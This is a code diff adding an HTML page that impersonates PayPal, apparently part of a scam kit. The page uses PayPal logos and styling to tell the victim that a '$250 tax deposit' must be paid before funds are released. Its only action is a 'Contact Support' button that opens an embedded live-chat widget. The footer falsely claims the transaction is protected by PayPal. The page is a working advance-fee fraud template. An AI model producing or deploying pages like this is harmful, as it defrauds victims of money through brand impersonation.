@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tax Deposit Required – PayPal</title>
+
+  <!-- Smartsupp Live Chat -->
+  <script>
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = 'YOUR_SMARTSUPP_KEY_HERE';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='//www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+  </script>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "PayPal Sans", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+      background: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ═══════════════════════
+       NAVIGATION BAR
+    ═══════════════════════ */
+    .pp-topbar {
+      background: #003087;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 1.25rem;
+    }
+
+    .pp-topbar-left {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 36px;
+      height: 36px;
+    }
+
+    /* Hamburger */
+    .hamburger {
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      padding: 2px;
+    }
+
+    .hamburger span {
+      display: block;
+      width: 20px;
+      height: 1.5px;
+      background: rgba(255,255,255,0.9);
+      border-radius: 1px;
+    }
+
+    /* PayPal P icon (white) for nav */
+    .pp-topbar-logo {
+      display: flex;
+      align-items: center;
+    }
+
+    .pp-topbar-logo svg { display: block; }
+
+    /* Bell icon */
+    .pp-topbar-right {
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pp-topbar-right button {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: rgba(255,255,255,0.85);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 4px;
+    }
+
+    /* ═══════════════════════
+       MAIN CONTENT
+    ═══════════════════════ */
+    .pp-main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2.5rem 1.25rem 3rem;
+      max-width: 440px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* Warning notice strip */
+    .pp-notice {
+      width: 100%;
+      background: #fff8e7;
+      border: 1px solid #f0d070;
+      border-left: 3px solid #f0a500;
+      border-radius: 4px;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1.5rem;
+      font-size: 0.82rem;
+      color: #5c4a00;
+      line-height: 1.55;
+    }
+
+    .pp-notice strong { font-weight: 600; }
+
+    /* White card */
+    .pp-card {
+      background: #fff;
+      border: 1px solid #d9dde3;
+      border-radius: 6px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.07), 0 4px 16px rgba(0,0,0,0.04);
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .pp-card-top {
+      padding: 1.75rem 1.75rem 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    /* PayPal wordmark in card */
+    .pp-card-top svg { display: block; margin-bottom: 1.25rem; }
+
+    .pp-card-heading {
+      font-size: 1.1rem;
+      font-weight: 400;
+      color: #2c2e2f;
+      line-height: 1.45;
+      margin-bottom: 0.6rem;
+    }
+
+    .pp-card-heading strong {
+      font-weight: 700;
+      color: #2c2e2f;
+    }
+
+    .pp-card-subtext {
+      font-size: 0.84rem;
+      color: #6c7378;
+      line-height: 1.6;
+      margin-bottom: 0;
+    }
+
+    /* Amount block */
+    .pp-amount-block {
+      margin: 1.5rem 1.75rem;
+      background: #f5f7fa;
+      border: 1px solid #e5e9f0;
+      border-radius: 4px;
+      padding: 1rem 1.25rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .pp-amount-block-label {
+      font-size: 0.82rem;
+      color: #6c7378;
+    }
+
+    .pp-amount-block-value {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #2c2e2f;
+      letter-spacing: -0.01em;
+    }
+
+    /* Divider */
+    .pp-card-divider {
+      border: none;
+      border-top: 1px solid #e5e9f0;
+      margin: 0 1.75rem;
+    }
+
+    /* "Contact Support below" label */
+    .pp-cta-label {
+      display: block;
+      text-align: center;
+      font-size: 0.84rem;
+      color: #6c7378;
+      padding: 1rem 1.75rem 0;
+    }
+
+    /* Actions */
+    .pp-card-actions {
+      padding: 1rem 1.75rem 1.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.65rem;
+    }
+
+    .pp-btn-contact {
+      display: block;
+      width: 100%;
+      padding: 0.78rem 1rem;
+      background: #2c2e2f;
+      color: #ffffff;
+      font-family: inherit;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      text-align: center;
+      letter-spacing: 0.01em;
+      transition: background 0.15s;
+    }
+
+    .pp-btn-contact:hover  { background: #1a1c1d; }
+    .pp-btn-contact:active { background: #111213; }
+
+    /* Card footer */
+    .pp-card-footer {
+      border-top: 1px solid #e5e9f0;
+      padding: 0.85rem 1.75rem;
+      text-align: center;
+    }
+
+    .pp-card-footer p {
+      font-size: 0.72rem;
+      color: #9da3aa;
+      line-height: 1.6;
+    }
+
+    .pp-card-footer a { color: #0070ba; text-decoration: none; }
+  </style>
+</head>
+<body>
+
+  <!-- Top Nav -->
+  <nav class="pp-topbar">
+    <div class="pp-topbar-left">
+      <button class="hamburger" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </div>
+
+    <div class="pp-topbar-logo">
+      <!-- White PayPal P icon for dark nav -->
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="30" viewBox="0 0 32 38" fill="none" aria-label="PayPal">
+        <path d="M27.6 5.3C26 3.5 23 2.6 19.1 2.6H7.4C6.5 2.6 5.8 3.2 5.6 4.1L1 31.1C.9 31.7 1.3 32.3 1.9 32.3H8.7L10.4 21.6l-.1.5C10.5 21.2 11.2 20.6 12.1 20.6h3.3c6.7 0 11.9-2.9 13.5-10.8.1-.3.1-.6.1-.8.1-1.5-.4-2.7-1.4-3.7z" fill="rgba(255,255,255,0.75)"/>
+        <path d="M12.3 9.1c.1-.5.4-.9.8-1.2.2-.1.5-.2.8-.2h9c1.1 0 2 .1 2.9.3.3.1.6.1.8.2.3.1.5.2.7.3.2.1.3.2.4.3.1.2.2.4.3.5C27.4 5.9 25 4.3 20.4 4.3H9.4c-.9 0-1.6.6-1.8 1.5L3 32.9c-.1.6.3 1.2.9 1.2h6.2l2.2-25z" fill="rgba(255,255,255,0.95)"/>
+        <path d="M28.9 9c0 .2 0 .5-.1.7-1.6 7.9-6.8 10.8-13.5 10.8H12c-.9 0-1.6.6-1.7 1.5L8.1 35.4c-.1.6.3 1.1.9 1.1h5.9c.8 0 1.4-.6 1.5-1.4l.1-.4 1.1-6.8.1-.5c.1-.8.7-1.4 1.5-1.4h.9c5.9 0 10.4-2.6 11.8-9.5.6-2.8.3-5.2-1.2-6.9-.4-.2-1-.4-1.7-.6z" fill="rgba(255,255,255,0.5)"/>
+      </svg>
+    </div>
+
+    <div class="pp-topbar-right">
+      <button aria-label="Notifications">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
+          <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+        </svg>
+      </button>
+    </div>
+  </nav>
+
+  <!-- Main -->
+  <main class="pp-main">
+
+    <!-- Warning notice -->
+    <div class="pp-notice">
+      <strong>Action Required</strong> — Your transaction cannot be completed. A tax deposit must be paid before funds can be released.
+    </div>
+
+    <!-- Card -->
+    <div class="pp-card">
+
+      <div class="pp-card-top">
+        <!-- PayPal wordmark in card -->
+        <svg xmlns="http://www.w3.org/2000/svg" width="90" height="23" viewBox="0 0 124 33" fill="none" aria-label="PayPal">
+          <path d="M18.571 6.113c-.428-2.783-2.924-4.6-6.49-4.6H4.826C4.3 1.513 3.86 1.9 3.78 2.42L1.013 19.973c-.06.386.24.734.63.734h4.593l1.154-7.325-.036.228c.08-.52.515-.907 1.04-.907h2.168c4.254 0 7.587-1.729 8.562-6.728.029-.147.054-.291.075-.432-.122-.065-.122-.065 0 0 .117-.748.117-1.254-.047-1.84" fill="#009cde"/>
+          <path d="M18.571 6.113c-.16.98-.472 1.886-.932 2.698-1.138 1.954-3.207 2.966-5.985 2.966H9.496c-.525 0-.96.387-1.04.907l-1.218 7.733-.345 2.189c-.052.33.203.628.537.628h3.775c.46 0 .847-.334.919-.789l.038-.196.729-4.624.047-.254c.072-.455.46-.789.92-.789h.579c3.753 0 6.69-1.525 7.549-5.936.358-1.84.173-3.375-.773-4.455-.287-.326-.628-.598-1.042-.826-.143-.082-.143-.082 0 0" fill="#003087"/>
+          <path d="M17.496 5.682a7.63 7.63 0 0 0-.938-.208 11.9 11.9 0 0 0-1.885-.137h-5.71c-.46 0-.847.334-.92.789l-1.215 7.703-.035.228c.08-.52.515-.907 1.04-.907h2.168c4.254 0 7.587-1.729 8.562-6.728.029-.147.054-.291.075-.432a6.34 6.34 0 0 0-.972-.277c-.063-.013-.063-.013 0 0" fill="#012169"/>
+          <path d="M37.37 8.4h-4.03c-.277 0-.513.198-.558.471l-1.63 10.33c-.033.21.13.4.343.4h1.925c.277 0 .513-.198.558-.471l.44-2.785c.044-.273.28-.471.558-.471h1.276c2.656 0 4.185-1.285 4.584-3.831.18-1.113.007-1.988-.516-2.6-.575-.672-1.593-1.043-2.95-1.043zm.465 3.773c-.22 1.44-1.323 1.44-2.39 1.44h-.607l.426-2.698c.025-.16.166-.278.33-.278h.278c.727 0 1.413 0 1.767.414.212.247.277.614.196 1.122zM49.17 12.14h-1.934c-.163 0-.305.117-.33.278l-.085.537-.134-.195c-.417-.605-1.346-.807-2.274-.807-2.128 0-3.946 1.611-4.3 3.872-.184 1.128.078 2.206.717 2.958.588.69 1.428 1.034 2.428 1.034 1.715 0 2.666-1.102 2.666-1.102l-.086.534c-.033.21.13.4.343.4h1.74c.277 0 .512-.198.557-.471l1.044-6.616c.034-.21-.13-.4-.342-.4zm-2.69 3.747c-.186 1.1-1.056 1.839-2.17 1.839-.558 0-1.005-.18-1.291-.52-.284-.337-.39-.817-.3-1.351.173-1.09 1.057-1.853 2.154-1.853.546 0 .99.181 1.282.525.294.347.408.831.325 1.36zM58.72 12.14h-1.942a.56.56 0 0 0-.462.245l-2.667 3.927-1.13-3.774a.558.558 0 0 0-.535-.398h-1.908c-.235 0-.4.231-.326.452l2.13 6.251-2.005 2.826c-.16.226.002.536.278.536h1.94c.181 0 .35-.088.454-.237l6.447-9.306c.157-.225-.004-.522-.274-.522z" fill="#003087"/>
+          <path d="M66.85 8.4h-4.03c-.277 0-.513.198-.558.471l-1.63 10.33c-.033.21.13.4.343.4h2.07c.194 0 .36-.14.39-.333l.463-2.923c.044-.273.28-.471.558-.471h1.276c2.656 0 4.185-1.285 4.584-3.831.18-1.113.007-1.988-.516-2.6-.575-.672-1.593-1.043-2.95-1.043zm.465 3.773c-.22 1.44-1.323 1.44-2.39 1.44h-.607l.426-2.698c.025-.16.166-.278.33-.278h.278c.727 0 1.413 0 1.767.414.212.247.277.614.196 1.122zM78.65 12.14h-1.934c-.163 0-.305.117-.33.278l-.085.537-.134-.195c-.417-.605-1.346-.807-2.274-.807-2.128 0-3.946 1.611-4.3 3.872-.184 1.128.078 2.206.717 2.958.588.69 1.428 1.034 2.428 1.034 1.715 0 2.666-1.102 2.666-1.102l-.086.534c-.033.21.13.4.343.4h1.74c.277 0 .512-.198.557-.471l1.044-6.616c.034-.21-.13-.4-.342-.4zm-2.69 3.747c-.186 1.1-1.056 1.839-2.17 1.839-.558 0-1.005-.18-1.291-.52-.284-.337-.39-.817-.3-1.351.173-1.09 1.057-1.853 2.154-1.853.546 0 .99.181 1.282.525.294.347.408.831.325 1.36zM81.49 8.65l-1.654 10.52c-.033.21.13.4.343.4h1.665c.277 0 .513-.198.558-.471l1.633-10.33c.033-.21-.13-.4-.343-.4h-1.86a.338.338 0 0 0-.342.281z" fill="#009cde"/>
+        </svg>
+
+        <p class="pp-card-heading">
+          A <strong id="taxAmountDisplay">$250</strong> Tax deposit is required to<br>complete this transaction.
+        </p>
+        <p class="pp-card-subtext">
+          Please contact support now to resolve this issue. Your order
+          cannot be processed without proper authorization.
+        </p>
+      </div>
+
+      <!-- Amount pill -->
+      <div class="pp-amount-block">
+        <span class="pp-amount-block-label">Tax Deposit Required</span>
+        <span class="pp-amount-block-value" id="taxAmountPill">$250.00</span>
+      </div>
+
+      <hr class="pp-card-divider">
+
+      <span class="pp-cta-label">Contact Support below</span>
+
+      <div class="pp-card-actions">
+        <button class="pp-btn-contact" onclick="smartsupp('chat:open')">Contact Support</button>
+      </div>
+
+      <div class="pp-card-footer">
+        <p>This transaction is protected by PayPal. &nbsp;<a href="#">Learn more</a></p>
+      </div>
+
+    </div>
+  </main>
+
+  <script src="../app.js"></script>
+  <script>
+    function loadTaxAmount() {
+      const data = getReceiptData();
+      const amount = data.taxDepositAmount !== undefined ? data.taxDepositAmount : 250;
+      const fmt = '$' + Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('taxAmountDisplay').textContent =
+        '$' + Number(amount).toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+      document.getElementById('taxAmountPill').textContent = fmt;
+    }
+
+    document.addEventListener('DOMContentLoaded', loadTaxAmount);
+  </script>
+</body>
+</html>
